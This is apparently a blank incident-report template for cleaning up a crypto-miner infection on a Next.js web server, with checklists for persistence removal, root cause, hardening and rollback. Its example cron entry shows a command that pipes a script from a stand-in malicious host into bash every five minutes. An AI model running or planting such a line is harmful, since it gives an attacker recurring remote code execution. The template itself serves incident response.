# Security Incident Report

## Incident Summary
- **Date**: [DATE]
- **Severity**: HIGH
- **Issue**: High CPU usage (~76%) - Malware infection
- **Status**: [IN PROGRESS / RESOLVED]

---

## 1. Malware Detection

### Malware Type/Name
- [ ] Crypto Miner (xmrig, ccminer, cpuminer)
- [ ] Backdoor/Shell (PHP shells, malicious scripts)
- [ ] Other: _________________

### Exact File Paths Removed
```
[List all files removed]
Example:
- /tmp/xmrig
- /var/tmp/malware.sh
- /var/www/naukrimili/.next/cache/suspicious.js
```

### Processes Killed
```
[List all processes killed]
Example:
- PID 1234: xmrig (crypto miner)
- PID 5678: /tmp/malware.sh
```

---

## 2. Persistence Mechanisms Cleaned

### Cron Jobs Removed
```
[List all malicious cron jobs]
Example:
- User: root | */5 * * * * wget -O- http://malicious.com/script.sh | bash
- /etc/cron.daily/malware
```

### System Services Disabled
```
[List all malicious services]
Example:
- systemctl stop malware-service
- systemctl disable malware-service
```

### Startup Scripts Removed
```
[List all startup scripts]
Example:
- /etc/rc.local: malicious entry
- /etc/init.d/malware
```

---

## 3. Root Cause Analysis

### Primary Vulnerability
- [ ] **CVE-2025-66478** - Next.js 15.5.2 RCE vulnerability
- [ ] **CVE-2024-56332** - Next.js Server Actions DoS
- [ ] **CVE-2025-49826** - Next.js Cache Poisoning
- [ ] **CVE-2025-29927** - Next.js Authorization Bypass
- [ ] Compromised dependency (npm package)
- [ ] Weak SSH credentials
- [ ] Exposed API keys/secrets
- [ ] Unpatched system packages
- [ ] Other: _________________

### Infection Vector
- [ ] Framework vulnerability exploit
- [ ] Compromised CI/CD pipeline
- [ ] Malicious npm package
- [ ] SSH brute force
- [ ] Exposed credentials
- [ ] Other: _________________

### Timeline
- **First Detection**: [DATE/TIME]
- **Infection Estimated**: [DATE/TIME]
- **Remediation Started**: [DATE/TIME]
- **Remediation Completed**: [DATE/TIME]

---

## 4. Safe Fixes Applied

### Package Updates
```
Next.js: 15.5.2 → 15.5.7+
React: [VERSION] → [VERSION]
Other packages: [LIST]
```

### Security Hardening
- [ ] Filesystem hardened (/tmp, /var/tmp with noexec)
- [ ] File permissions secured
- [ ] SSH hardened
- [ ] Firewall configured
- [ ] Fail2Ban installed
- [ ] Cron monitoring enabled

### Build Environment Cleaned
- [ ] .next/cache cleared
- [ ] node_modules/.cache cleared
- [ ] npm cache cleared
- [ ] Clean rebuild performed

---

## 5. CPU Usage Metrics

### Before Remediation
```
Date: [DATE/TIME]
CPU Usage: 76%
Top Processes:
- [PROCESS 1]: [CPU%]
- [PROCESS 2]: [CPU%]
- [PROCESS 3]: [CPU%]
```

### After Remediation
```
Date: [DATE/TIME]
CPU Usage: [%]
Top Processes:
- [PROCESS 1]: [CPU%]
- [PROCESS 2]: [CPU%]
- [PROCESS 3]: [CPU%]
```

### Improvement
- CPU Reduction: [X]%
- Status: ✅ NORMAL / ⚠️ MODERATE / ❌ STILL HIGH

---

## 6. Final Verification Checklist

### System Health
- [ ] CPU usage < 20% (normal)
- [ ] No malware processes running
- [ ] No malware files present
- [ ] No malicious cron jobs
- [ ] Application running (PM2 status: online)
- [ ] Health endpoint responding
- [ ] No suspicious network connections

### Security Posture
- [ ] Next.js upgraded to safe version (15.5.7+)
- [ ] All dependencies updated
- [ ] Filesystem hardened
- [ ] SSH secured
- [ ] Firewall active
- [ ] Monitoring enabled

### Application Status
- [ ] Build successful
- [ ] PM2 process running
- [ ] HTTP endpoints responding
- [ ] Database connections working
- [ ] No error logs
- [ ] Zero downtime maintained

---

## 7. Prevention Measures

### Immediate Actions
- [ ] Rotate all API keys and secrets
- [ ] Review GitHub Actions secrets
- [ ] Audit SSH access logs
- [ ] Review system logs for intrusion indicators
- [ ] Update all system packages

### Long-term Measures
- [ ] Set up automated security scanning
- [ ] Implement log monitoring
- [ ] Schedule regular security audits
- [ ] Keep dependencies updated
- [ ] Review and harden CI/CD pipeline
- [ ] Implement intrusion detection

---

## 8. Rollback Plan (if needed)

### Backup Location
```
/var/backups/naukrimili-before-cleanup-[TIMESTAMP]
/var/backups/naukrimili-security/backup-[TIMESTAMP]
```

### Rollback Steps
1. Restore package.json: `cp [BACKUP]/package.json package.json`
2. Restore package-lock.json: `cp [BACKUP]/package-lock.json package-lock.json`
3. Reinstall: `npm install --legacy-peer-deps`
4. Rebuild: `npm run build`
5. Restart: `pm2 restart jobportal`

---

## 9. Lessons Learned

### What Went Wrong
- [Description]

### What Worked Well
- [Description]

### Recommendations
- [Recommendation 1]
- [Recommendation 2]
- [Recommendation 3]

---

## 10. Sign-off

- **Remediation Completed By**: [NAME]
- **Date**: [DATE]
- **Verified By**: [NAME]
- **Date**: [DATE]
- **Status**: ✅ RESOLVED / ⚠️ MONITORING / ❌ ESCALATED

---

## Notes
[Additional notes, observations, or concerns]

